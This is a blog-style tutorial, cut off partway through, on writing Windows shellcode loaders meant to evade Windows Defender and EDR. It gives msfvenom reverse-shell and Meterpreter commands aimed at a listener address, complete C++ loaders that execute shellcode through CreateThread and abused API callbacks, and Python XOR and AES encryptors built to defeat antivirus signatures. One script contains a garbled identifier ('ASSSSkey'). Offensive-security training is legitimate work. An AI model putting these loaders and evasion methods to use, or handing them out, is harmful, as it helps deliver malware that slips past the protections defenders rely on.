---
title: "Shellcode Development — From Zero to Bypassing Windows Defender in 2026"
date: 2026-04-02 15:00:00 +0200
categories: [Malware Development, Red Team]
tags: [shellcode, malware-development, windows-defender-bypass, edr-evasion, c-cpp, syscalls, process-injection, encryption, xor, aes, amsi-bypass, etw-patch, red-team]
description: "A comprehensive guide to shellcode development in C/C++ — from understanding what shellcode is, through basic execution techniques, to advanced EDR/AV bypass methods including direct syscalls, indirect syscalls, sleep obfuscation, and process injection. Covers Windows 10 and 11 protections up to 2026."
image:
  path: /assets/img/posts/shellcode.png
  alt: Shellcode Development Zero to Advanced
pin: true
math: true
---

> **DISCLAIMER — EDUCATIONAL PURPOSE ONLY**
>
> This blog post is written strictly for **educational purposes**, **authorized penetration testing**, and **red team operations**. All techniques described here should only be used in environments where you have **explicit written authorization**. Unauthorized access to computer systems is a criminal offense in virtually every jurisdiction worldwide. The author assumes no responsibility for misuse of this material. If you are studying offensive security, always practice in isolated lab environments or with proper authorization under a Rules of Engagement (RoE) agreement.
{: .prompt-danger }

## Table of Contents

- [Part 1: Foundations — What is Shellcode?](#part-1-foundations--what-is-shellcode)
- [Part 2: Basic Shellcode Execution (Level 1 — Beginner)](#part-2-basic-shellcode-execution-level-1--beginner)
- [Part 3: Shellcode Encryption (Level 2 — Intermediate)](#part-3-shellcode-encryption-level-2--intermediate)
- [Part 4: Evading Static Detection (Level 3 — Advanced)](#part-4-evading-static-detection-level-3--advanced)
- [Part 5: Evading Dynamic/Behavioral Detection (Level 4 — Advanced)](#part-5-evading-dynamicbehavioral-detection-level-4--advanced)
- [Part 6: Process Injection (Level 5 — Expert)](#part-6-process-injection-level-5--expert)
- [Part 7: Advanced Evasion (Level 6 — Elite/2026)](#part-7-advanced-evasion-level-6--elite2026)
- [Part 8: Compilation and OPSEC](#part-8-compilation-and-opsec)
- [Part 9: Putting It All Together — Final Loader](#part-9-putting-it-all-together--final-loader)
- [Part 10: References](#part-10-references)

---

## Part 1: Foundations — What is Shellcode?

### What is Shellcode?

Shellcode is a small, self-contained piece of machine code (typically written in assembly language) that is designed to be injected directly into the memory of a running process and executed. Unlike a traditional executable file (`.exe`), shellcode has no headers, no imports table, and no reliance on the operating system's loader — it is raw CPU instructions.

**Origin of the Name**

The term "shellcode" dates back to the early days of exploitation. The original purpose of these code fragments was to spawn a command shell (`/bin/sh` on Unix, `cmd.exe` on Windows) after exploiting a vulnerability — hence "shell" + "code." Today, the term has evolved far beyond shell spawning.

**Modern Use Cases**

In contemporary offensive security, shellcode is used for:

1. **Reverse shells** — Connect back to an attacker-controlled listener, providing interactive command-line access
2. **Meterpreter sessions** — Launch a full-featured post-exploitation framework agent in memory
3. **Payload staging** — Download and execute a second-stage payload from a remote server
4. **Privilege escalation** — Execute code in the context of a higher-privileged process
5. **Credential harvesting** — Dump credentials from memory (e.g., LSASS)
6. **Lateral movement** — Inject into remote processes on other machines in the network

**Why Attackers Use Shellcode**

| Advantage | Explanation |
|---|---|
| **Stealth** | Shellcode lives only in memory — no file on disk means fewer forensic artifacts |
| **Customization** | Every byte can be controlled, allowing tailored payloads |
| **Flexibility** | Can be injected into any process, regardless of what that process normally does |
| **Portability** | Position-independent shellcode works regardless of where it's loaded in memory |
| **Evasion** | Encrypted shellcode on disk looks like random data; it only becomes executable at runtime |
| **Small size** | Typical shellcode is a few hundred bytes, easy to embed or transmit |

**Shellcode vs. PE Files vs. DLLs**

| Property | Shellcode | PE (.exe) | DLL (.dll) |
|---|---|---|---|
| File headers | None | PE/COFF headers | PE/COFF headers |
| Import table | None (resolves APIs manually) | Yes | Yes |
| Loaded by OS | No (manually injected) | Yes (CreateProcess) | Yes (LoadLibrary) |
| Position independent | Yes (typically) | No (has preferred base) | Partially (relocatable) |
| Disk artifact | Optional | Required | Required |
| Detection by AV | Only at execution time (if encrypted) | Scanned on disk + execution | Scanned on load |

> Shellcode's greatest advantage is that it can exist purely in memory. If encrypted on disk and decrypted only at runtime, antivirus software has a much harder time detecting it through static analysis.
{: .prompt-info }

---

### Understanding Windows Memory and Protection

Before we can execute shellcode, we need to understand how Windows manages memory.

**Virtual Memory Model**

Every Windows process operates within its own virtual address space. On 64-bit systems, each process has a 128 TB virtual address space (though only a fraction is actually committed to physical memory). The operating system manages this through **pages** — 4 KB blocks of memory, each with its own protection attributes.

**Memory Protection Constants**

Windows defines memory protection flags in `memoryapi.h`. The ones critical for shellcode development:

| Constant | Value | Read | Write | Execute | Use Case |
|---|---|---|---|---|---|
| `PAGE_READONLY` | `0x02` | Yes | No | No | Read-only data |
| `PAGE_READWRITE` | `0x04` | Yes | Yes | No | Normal data, heap allocations |
| `PAGE_EXECUTE` | `0x10` | No | No | Yes | Rare, code-only |
| `PAGE_EXECUTE_READ` | `0x20` | Yes | No | Yes | Code sections (.text) |
| `PAGE_EXECUTE_READWRITE` | `0x40` | Yes | Yes | Yes | **Highly suspicious** |
| `PAGE_EXECUTE_WRITECOPY` | `0x80` | Yes | Yes (COW) | Yes | Used by OS for shared DLLs |

**Why RWX Memory is Dangerous and Detected**

Memory that is simultaneously **readable, writable, and executable** (`PAGE_EXECUTE_READWRITE`, or "RWX") is one of the strongest indicators of malicious activity. Legitimate applications almost never need this combination — code sections are typically `RX` (execute + read) and data sections are `RW` (read + write).

Modern EDRs (Endpoint Detection and Response) and Windows Defender specifically monitor for:
- Calls to `VirtualAlloc` with `PAGE_EXECUTE_READWRITE`
- Memory regions that are both writable and executable simultaneously
- Transitions from `RW` to `RWX`

**The Two-Step Approach: W^X Compliance**

The correct approach follows the "Write XOR Execute" (W^X) principle:

1. **Allocate** memory as `PAGE_READWRITE` (writable, not executable)
2. **Write** your shellcode into this memory
3. **Change** the protection to `PAGE_EXECUTE_READ` (executable, not writable) using `VirtualProtect`
4. **Execute** the shellcode

This mimics how the Windows loader handles legitimate code sections and avoids the RWX red flag.

```
Allocate (RW) → Write Shellcode → Protect (RX) → Execute
```

---

### Generating Shellcode with msfvenom

`msfvenom` is the primary shellcode generation tool from the Metasploit Framework. It combines payload generation and encoding into a single tool.

**Installation (Kali Linux / Ubuntu)**

```bash
sudo apt update && sudo apt install metasploit-framework -y
```

**Command 1: Windows x64 Reverse Shell (C format)**

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=192.168.1.100 \
    LPORT=443 \
    -f c
```

This outputs a C-compatible byte array:

```c
unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51..."
```

**Command 2: Meterpreter Reverse TCP (raw binary)**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 \
    LPORT=443 \
    -f raw \
    -o payload.bin
```

The raw format is useful when you need to encrypt the shellcode with external tools before embedding it.

**Command 3: Calc.exe — Safe Testing Payload**

```bash
msfvenom -p windows/exec \
    EXITFUNC=thread \
    CMD=calc.exe \
    -f c
```

> Always test your loaders with a harmless payload like `calc.exe` first. This avoids triggering network-based detections from real reverse shell connections during development.
{: .prompt-tip }

**Command 4: Raw Format for External Encryption**

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=192.168.1.100 \
    LPORT=443 \
    -f raw \
    -o payload.bin
```

This generates a raw binary file that you can encrypt with Python scripts (shown later in this blog).

**Command 5: List All Available Payloads**

```bash
msfvenom -l payloads | grep windows/x64
```

Common x64 Windows payloads:
- `windows/x64/shell_reverse_tcp` — Staged reverse shell
- `windows/x64/shell/reverse_tcp` — Stageless reverse shell
- `windows/x64/meterpreter/reverse_tcp` — Staged Meterpreter
- `windows/x64/meterpreter_reverse_tcp` — Stageless Meterpreter
- `windows/x64/exec` — Execute a command

> **Critical Warning:** Raw msfvenom shellcode is **instantly detected** by Windows Defender, any commercial AV, and every modern EDR. The byte patterns are well-known signatures. The entire rest of this blog teaches you how to transform this shellcode into something that bypasses these defenses.
{: .prompt-warning }

---

## Part 2: Basic Shellcode Execution (Level 1 — Beginner)

This section covers the fundamental methods for executing shellcode in your own process. These techniques are the building blocks for everything that follows.

---

### Technique 1: Classic — VirtualAlloc + RtlMoveMemory + CreateThread

This is the most straightforward shellcode execution method. It allocates memory, copies shellcode into it, changes memory permissions, and creates a thread to execute it.

**Step-by-step breakdown:**

1. **Define the shellcode** as an unsigned char array (generated by msfvenom)
2. **Allocate a memory region** using `VirtualAlloc` with `PAGE_READWRITE` permissions
3. **Copy the shellcode** into the allocated region using `RtlMoveMemory`
4. **Change memory protection** from `RW` to `RX` using `VirtualProtect`
5. **Create a new thread** pointing to the shellcode using `CreateThread`
6. **Wait for the thread** to finish using `WaitForSingleObject`

**API Reference:**

| Function | Purpose | Key Parameters |
|---|---|---|
| `VirtualAlloc` | Allocate virtual memory | lpAddress, dwSize, flAllocationType, flProtect |
| `RtlMoveMemory` | Copy bytes to destination | Destination, Source, Length |
| `VirtualProtect` | Change memory protection | lpAddress, dwSize, flNewProtect, lpflOldProtect |
| `CreateThread` | Create a new thread | lpStartAddress (shellcode pointer) |
| `WaitForSingleObject` | Wait for thread completion | hHandle, dwMilliseconds |

**Full Code — `technique01_classic.cpp`:**

```cpp
#include <windows.h>
#include <stdio.h>

// msfvenom -p windows/exec EXITFUNC=thread CMD=calc.exe -f c
// Replace with your shellcode
unsigned char shellcode[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
    "\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
    "\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
    "\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
    "\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
    "\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
    "\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
    "\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
    "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
    "\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
    "\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
    "\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
    "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48"
    "\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d"
    "\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5";

int main() {
    // Step 1: Get the shellcode size
    SIZE_T shellcodeSize = sizeof(shellcode);
    printf("[*] Shellcode size: %zu bytes\n", shellcodeSize);

    // Step 2: Allocate memory with READ + WRITE permissions (NOT executable yet)
    LPVOID allocatedMemory = VirtualAlloc(
        NULL,                   // Let the system choose the address
        shellcodeSize,          // Size of the allocation
        MEM_COMMIT | MEM_RESERVE,  // Commit and reserve the memory
        PAGE_READWRITE          // RW only — no execute permission yet
    );

    if (allocatedMemory == NULL) {
        printf("[-] VirtualAlloc failed: %d\n", GetLastError());
        return 1;
    }
    printf("[+] Memory allocated at: 0x%p\n", allocatedMemory);

    // Step 3: Copy shellcode into the allocated memory
    RtlMoveMemory(
        allocatedMemory,        // Destination
        shellcode,              // Source
        shellcodeSize           // Number of bytes to copy
    );
    printf("[+] Shellcode copied to allocated memory\n");

    // Step 4: Change memory protection from RW to RX (Write XOR Execute)
    DWORD oldProtect;
    BOOL protectResult = VirtualProtect(
        allocatedMemory,        // Address of the region
        shellcodeSize,          // Size of the region
        PAGE_EXECUTE_READ,      // New protection: Read + Execute
        &oldProtect             // Receives the old protection value
    );

    if (!protectResult) {
        printf("[-] VirtualProtect failed: %d\n", GetLastError());
        return 1;
    }
    printf("[+] Memory protection changed to RX (was: 0x%lx)\n", oldProtect);

    // Step 5: Create a thread that starts executing at our shellcode
    HANDLE hThread = CreateThread(
        NULL,                                      // Default security attributes
        0,                                         // Default stack size
        (LPTHREAD_START_ROUTINE)allocatedMemory,   // Thread start address = shellcode
        NULL,                                      // No parameter to thread function
        0,                                         // Run immediately (no CREATE_SUSPENDED)
        NULL                                       // Don't need the thread ID
    );

    if (hThread == NULL) {
        printf("[-] CreateThread failed: %d\n", GetLastError());
        return 1;
    }
    printf("[+] Thread created, shellcode executing...\n");

    // Step 6: Wait for the thread to finish (INFINITE = wait forever)
    WaitForSingleObject(hThread, INFINITE);

    // Cleanup
    CloseHandle(hThread);
    VirtualFree(allocatedMemory, 0, MEM_RELEASE);

    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ -o technique01_classic.exe technique01_classic.cpp -lws2_32 -static
```

> This technique is the "Hello World" of shellcode execution. Every detection engine on the planet flags it. However, understanding it is essential — all advanced techniques are variations of these same fundamental steps.
{: .prompt-warning }

---

### Technique 2: Callback-Based Execution — EnumChildWindows

One of the most common detection heuristics targets `CreateThread` with a dynamically allocated memory address as the start routine. We can avoid `CreateThread` entirely by abusing Windows API functions that accept **callback function pointers**.

`EnumChildWindows` enumerates child windows of a parent window. It accepts a callback function (`WNDENUMPROC`) that gets called for each child window found. If we pass the address of our shellcode as this callback, Windows will execute our shellcode for us — without `CreateThread`.

**Step-by-step breakdown:**

1. **Allocate memory** with `VirtualAlloc` (`PAGE_READWRITE`)
2. **Copy shellcode** with `RtlMoveMemory`
3. **Change protection** with `VirtualProtect` (`PAGE_EXECUTE_READ`)
4. **Call `EnumChildWindows`** with shellcode address as the callback — shellcode executes as a "legitimate" callback

**Full Code — `technique02_enumchildwindows.cpp`:**

```cpp
#include <windows.h>
#include <stdio.h>

// Replace with your shellcode (msfvenom calc.exe payload for testing)
unsigned char shellcode[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
    "\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
    "\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
    "\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
    "\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\xe2\xed\x52\x41\x51";
    // ... (truncated for brevity — use full shellcode in practice)

int main() {
    SIZE_T shellcodeSize = sizeof(shellcode);

    // Step 1: Allocate RW memory
    LPVOID mem = VirtualAlloc(NULL, shellcodeSize,
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    if (!mem) {
        printf("[-] VirtualAlloc failed: %d\n", GetLastError());
        return 1;
    }

    // Step 2: Copy shellcode
    RtlMoveMemory(mem, shellcode, shellcodeSize);

    // Step 3: Change to RX
    DWORD oldProtect;
    VirtualProtect(mem, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);

    // Step 4: Execute via EnumChildWindows callback
    // GetDesktopWindow() returns the handle to the desktop window
    // EnumChildWindows will call our "callback" (shellcode) for each child window
    printf("[+] Executing shellcode via EnumChildWindows callback...\n");
    EnumChildWindows(GetDesktopWindow(), (WNDENUMPROC)mem, 0);

    // Cleanup
    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ -o technique02_enumchild.exe technique02_enumchildwindows.cpp -lws2_32 -static
```

**Why this works:** Windows calls the callback function pointer internally through its own code. The call stack looks more legitimate because the call originates from `user32.dll` rather than directly from your code via `CreateThread`.

---

### Technique 3: Callback-Based Execution — EnumWindows

`EnumWindows` works similarly to `EnumChildWindows`, but enumerates all top-level windows on the screen. It also accepts a callback function pointer.

**Full Code — `technique03_enumwindows.cpp`:**

```cpp
#include <windows.h>
#include <stdio.h>

// Replace with your shellcode
unsigned char shellcode[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
    "\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
    "\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
    "\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
    "\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\xe2\xed\x52\x41\x51";
    // ... (truncated for brevity)

int main() {
    SIZE_T shellcodeSize = sizeof(shellcode);

    // Step 1: Allocate RW memory
    LPVOID mem = VirtualAlloc(NULL, shellcodeSize,
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    if (!mem) return 1;

    // Step 2: Copy shellcode
    RtlMoveMemory(mem, shellcode, shellcodeSize);

    // Step 3: Change to RX
    DWORD oldProtect;
    VirtualProtect(mem, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);

    // Step 4: Execute via EnumWindows callback
    printf("[+] Executing shellcode via EnumWindows callback...\n");
    EnumWindows((WNDENUMPROC)mem, 0);

    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ -o technique03_enumwindows.exe technique03_enumwindows.cpp -lws2_32 -static
```

---

### Technique 4: Other Callback Functions for Shellcode Execution

Windows has hundreds of API functions that accept callback parameters. Here is a non-exhaustive list of functions that can be abused:

| Function | Library | Callback Parameter |
|---|---|---|
| `EnumChildWindows` | user32.dll | `WNDENUMPROC lpEnumFunc` |
| `EnumWindows` | user32.dll | `WNDENUMPROC lpEnumFunc` |
| `EnumDesktopWindows` | user32.dll | `WNDENUMPROC lpfn` |
| `EnumDateFormatsA` | kernel32.dll | `DATEFMT_ENUMPROCA lpDateFmtEnumProc` |
| `EnumSystemLocalesA` | kernel32.dll | `LOCALE_ENUMPROCA lpLocaleEnumProc` |
| `CreateTimerQueueTimer` | kernel32.dll | `WAITORTIMERCALLBACK Callback` |
| `CertEnumSystemStore` | crypt32.dll | `PFN_CERT_ENUM_SYSTEM_STORE pfnEnum` |
| `EnumResourceTypesA` | kernel32.dll | `ENUMRESTYPEPROCA lpEnumFunc` |
| `EnumDesktopsA` | user32.dll | `DESKTOPENUMPROCA lpEnumFunc` |
| `EnumThreadWindows` | user32.dll | `WNDENUMPROC lpfn` |

**Example: CreateTimerQueueTimer**

```cpp
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0..."; // Your shellcode

int main() {
    SIZE_T shellcodeSize = sizeof(shellcode);

    LPVOID mem = VirtualAlloc(NULL, shellcodeSize,
                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    RtlMoveMemory(mem, shellcode, shellcodeSize);

    DWORD oldProtect;
    VirtualProtect(mem, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);

    // Create a timer queue
    HANDLE hTimerQueue = CreateTimerQueue();
    HANDLE hTimer = NULL;

    // Schedule shellcode execution via timer callback
    // DueTime = 0 (immediate), Period = 0 (one-shot)
    CreateTimerQueueTimer(&hTimer, hTimerQueue,
                          (WAITORTIMERCALLBACK)mem,
                          NULL, 0, 0, 0);

    // Keep the process alive so the timer can fire
    Sleep(5000);

    // Cleanup
    DeleteTimerQueueEx(hTimerQueue, NULL);
    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ -o technique04_timer.exe technique04_timer.cpp -lws2_32 -static
```

> Every Windows API function that accepts a callback (function pointer) parameter can potentially be used to execute shellcode without ever calling `CreateThread`. This is a powerful concept — look for callback parameters in any Win32 API function documentation.
{: .prompt-tip }

---

## Part 3: Shellcode Encryption (Level 2 — Intermediate)

### Why Encryption is Essential

When you compile a loader with raw msfvenom shellcode embedded in it, every antivirus product on the market will detect it instantly. Here's why:

**Static Analysis** — Antivirus engines scan every byte of your executable file on disk. They maintain massive databases of known byte patterns (signatures). Msfvenom shellcode has well-known byte sequences that are cataloged by every vendor.

**The Solution: Encryption**

By encrypting the shellcode before embedding it in your loader, the bytes on disk look like random noise. The AV scanner cannot match any known signature because the signature is destroyed by encryption. Only at runtime does your loader decrypt the shellcode in memory and execute it.

**Encoding vs. Encryption**

| Property | Encoding (e.g., Base64, XOR with known key) | Encryption (e.g., AES-256) |
|---|---|---|
| Key required | No (or trivially discoverable) | Yes (secret key) |
| Reversible by AV | Easily | Not without the key |
| Security | Obfuscation only | Cryptographic strength |
| Use case | Transport format | Actual evasion |

---

### Technique 5: XOR Encryption

XOR is the simplest encryption operation and a great starting point. It's fast, easy to implement, and adds zero dependencies.

**How XOR Works**

XOR (exclusive OR) is a bitwise operation:
- `0 XOR 0 = 0`
- `0 XOR 1 = 1`
- `1 XOR 0 = 1`
- `1 XOR 1 = 0`

The key property: **XOR is its own inverse**. If you XOR data with a key, XORing the result with the same key gives you the original data back.

$$
\text{plaintext} \oplus \text{key} = \text{ciphertext}
$$

$$
\text{ciphertext} \oplus \text{key} = \text{plaintext}
$$

**Step 1: Generate raw shellcode**

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=192.168.1.100 LPORT=443 \
    -f raw -o payload.bin
```

**Step 2: Python XOR Encryptor — `xor_encrypt.py`**
```liquid
{% raw %}

#!/usr/bin/env python3
"""
XOR Shellcode Encryptor
Reads raw shellcode from a file, XOR-encrypts it with a multi-byte key,
and outputs a C-compatible array.
"""

import sys
import os

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    """XOR encrypt data with a repeating multi-byte key."""
    encrypted = bytearray()
    for i, byte in enumerate(data):
        encrypted.append(byte ^ ASSSSkey[i % len(key)])
    return bytes(encrypted)

def format_c_array(data: bytes, var_name: str = "shellcode") -> str:
    """Format bytes as a C unsigned char array."""
    hex_bytes = [f"0x{b:02x}" for b in data]

    lines = [f"unsigned char {var_name}[] = " + "{"]  # open brace as plain string
    for i in range(0, len(hex_bytes), 12):
        chunk = ", ".join(hex_bytes[i:i+12])
        lines.append(f"    {chunk},")
    lines.append("};")
    return "\n".join(lines)

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <payload.bin>")
        sys.exit(1)

    payload_file = sys.argv[1]

    # Read raw shellcode
    with open(payload_file, "rb") as f:
        shellcode = f.read()

    print(f"[*] Original shellcode size: {len(shellcode)} bytes")

    # Generate a random multi-byte key (16 bytes)
    key = os.urandom(16)
    print(f"[*] XOR Key: {key.hex()}")
    print(f"[*] XOR Key (C array):")
    print(format_c_array(key, "xor_key"))
    print()

    # Encrypt
    encrypted = xor_encrypt(shellcode, key)
    print(f"[*] Encrypted shellcode size: {len(encrypted)} bytes")

    # Show first 32 bytes comparison
    print(f"\n[*] Original (first 32 bytes):  {shellcode[:32].hex()}")
    print(f"[*] Encrypted (first 32 bytes): {encrypted[:32].hex()}")

    # Output C array
    print(f"\n[*] Encrypted shellcode (C array):")
    print(format_c_array(encrypted, "encrypted_shellcode"))

    # Save to file
    output_file = payload_file + ".xor"
    with open(output_file, "wb") as f:
        f.write(encrypted)

    print(f"\n[+] Encrypted payload saved to: {output_file}")
    print(f"[+] Key saved to: {output_file}.key")

    with open(output_file + ".key", "wb") as f:
        f.write(key)

if __name__ == "__main__":
    main()
```
{% endraw %}

**Usage:**

```bash
python3 xor_encrypt.py payload.bin
```

**Step 3: C++ XOR Decryptor + Loader — `technique05_xor_loader.cpp`**

```cpp
#include <windows.h>
#include <stdio.h>

// XOR key (16 bytes) — generated by xor_encrypt.py
unsigned char xor_key[] = {
    0x4a, 0x7b, 0x2e, 0x91, 0xf3, 0xc8, 0x55, 0xd2,
    0x0a, 0x3f, 0x8c, 0xe1, 0x67, 0xb4, 0x19, 0xa6
};

// XOR-encrypted shellcode — generated by xor_encrypt.py
unsigned char encrypted_shellcode[] = {
    0xb6, 0x33, 0xad, 0x75, 0x03, 0x20, 0x95, 0xd2,
    // ... paste full encrypted output from Python script here ...
    0x00  // placeholder
};

void xor_decrypt(unsigned char* data, SIZE_T data_len,
                 unsigned char* key, SIZE_T key_len) {
    for (SIZE_T i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

int main() {
    SIZE_T shellcodeSize = sizeof(encrypted_shellcode);
    SIZE_T keySize = sizeof(xor_key);

    printf("[*] Encrypted shellcode size: %zu bytes\n", shellcodeSize);

    // Step 1: Allocate RW memory
    LPVOID mem = VirtualAlloc(NULL, shellcodeSize,
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    if (!mem) {
        printf("[-] VirtualAlloc failed: %d\n", GetLastError());
        return 1;
    }

    // Step 2: Copy encrypted shellcode to allocated memory
    RtlMoveMemory(mem, encrypted_shellcode, shellcodeSize);

    // Step 3: Decrypt in place (XOR decryption happens in memory only)
    xor_decrypt((unsigned char*)mem, shellcodeSize, xor_key, keySize);
    printf("[+] Shellcode decrypted in memory\n");

    // Step 4: Change to RX
    DWORD oldProtect;
    VirtualProtect(mem, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);

    // Step 5: Execute via callback
    printf("[+] Executing shellcode...\n");
    EnumChildWindows(GetDesktopWindow(), (WNDENUMPROC)mem, 0);

    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}
```

**Compilation:**

```bash
x86_64-w64-mingw32-g++ -o technique05_xor.exe technique05_xor_loader.cpp -lws2_32 -static
```

> Single-byte XOR keys are trivial for AV to brute-force (only 256 possibilities). Always use a multi-byte key of at least 16 bytes. The longer and more random the key, the harder it is for automated analysis to decrypt your shellcode.
{: .prompt-tip }

---

### Technique 6: AES-256 Encryption

While XOR can evade basic signature matching, sophisticated AV engines can brute-force short XOR keys or use entropy analysis. AES-256 provides cryptographic-grade encryption that cannot be broken without the key.

**AES Overview:**
- **Symmetric encryption** — same key encrypts and decrypts
- **AES-256** uses a 256-bit (32-byte) key with 14 rounds of transformation
- **CBC mode** (Cipher Block Chaining) requires an Initialization Vector (IV)
- **PKCS7 padding** handles shellcode that isn't a multiple of 16 bytes

**Step 1: Python AES Encryptor — `aes_encrypt.py`**
```liquid
{% raw %}

#!/usr/bin/env python3
"""
AES-256-CBC Shellcode Encryptor
Requires: pip install pycryptodome
"""

import sys
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def format_c_array(data: bytes, var_name: str) -> str:
    """Format bytes as a C unsigned char array."""
    hex_bytes = [f"0x{b:02x}" for b in data]
    lines = [f"unsigned char {var_name}[] = {{"]
    for i in range(0, len(hex_bytes), 12):
        chunk = ", ".join(hex_bytes[i:i+12])
        lines.append(f"    {chunk},")
    lines.append("};")
    return "\n".join(lines)

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <payload.bin>")
        sys.exit(1)

    with open(sys.argv[1], "rb") as f:
        shellcode = f.read()

    print(f"[*] Original shellcode size: {len(shellcode)} bytes")

    # Generate random 256-bit key and 128-bit IV
    key = os.urandom(32)  # 256 bits
    iv  = os.urandom(16)  # 128 bits (AES block size)

    print(f"[*] AES-256 Key: {key.hex()}")
    print(f"[*] AES IV:      {iv.hex()}")

    # Encrypt with AES-256-CBC
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_shellcode = pad(shellcode, AES.block_size)  # PKCS7 padding
    encrypted = cipher.encrypt(padded_shellcode)

    print(f"[*] Padded size:    {len(padded_shellcode)} bytes")
    print(f"[*] Encrypted size: {len(encrypted)} bytes")

    # Output C arrays
    print(f"\n// AES-256 Key (32 bytes)")
    print(format_c_array(key, "aes_key"))
    print(f"\n// AES IV (16 bytes)")
    print(format_c_array(iv, "aes_iv"))
    print(f"\n// Encrypted shellcode ({len(encrypted)} bytes)")
    print(format_c_array(encrypted, "encrypted_shellcode"))
    print(f"\n// Original shellcode size (before padding)")
    print(f"SIZE_T original_shellcode_size = {len(shellcode)};")

    # Save encrypted payload
    output_file = sys.argv[1] + ".aes"
    with open(output_file, "wb") as f:
        f.write(key + iv + encrypted)
    print(f"\n[+] Saved to: {output_file} (key + iv + ciphertext)")

if __name__ == "__main__":
    main()
```
{% endraw %}
**Usage:**

```bash
pip install pycryptodome
python3 aes_encrypt.py payload.bin
```

**Step 2: C++ AES Decryptor + Loader (using Windows BCrypt API) — `technique06_aes_loader.cpp`**

```cpp
#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>

#pragma comment(lib, "bcrypt.lib")

// Paste the output from aes_encrypt.py here:

// AES-256 Key (32 bytes)
unsigned char aes_key[] = {
    0x60, 0x72, 0xa3, 0x14, 0xb5, 0xc6, 0xd7, 0xe8,
    0xf9, 0x0a, 0x1b, 0x2c, 0x3d, 0x4e, 0x5f, 0x60,
    0x71, 0x82, 0x93, 0xa4, 0xb5, 0xc6, 0xd7, 0xe8,
    0xf9, 0x0a, 0x1b, 0x2c, 0x3d, 0x4e, 0x5f, 0x60
};

// AES IV (16 bytes)
unsigned char aes_iv[] = {
    0xa1, 0xb2, 0xc3, 0xd4, 0xe5, 0xf6, 0x07, 0x18,
    0x29, 0x3a, 0x4b, 0x5c, 0x6d, 0x7e, 0x8f, 0x90
};

// Encrypted shellcode — paste from Python output
unsigned char encrypted_shellcode[] = {
    // ... paste encrypted shellcode bytes here ...
    0x00  // placeholder
};

// Original shellcode size before AES padding
SIZE_T original_shellcode_size = 460;  // Update this from Python output

BOOL AESDecrypt(unsigned char* ciphertext, SIZE_T ciphertext_len,
                unsigned char* key, SIZE_T key_len,
                unsigned char* iv, SIZE_T iv_len,
                unsigned char** plaintext, SIZE_T* plaintext_len) {

    NTSTATUS status;
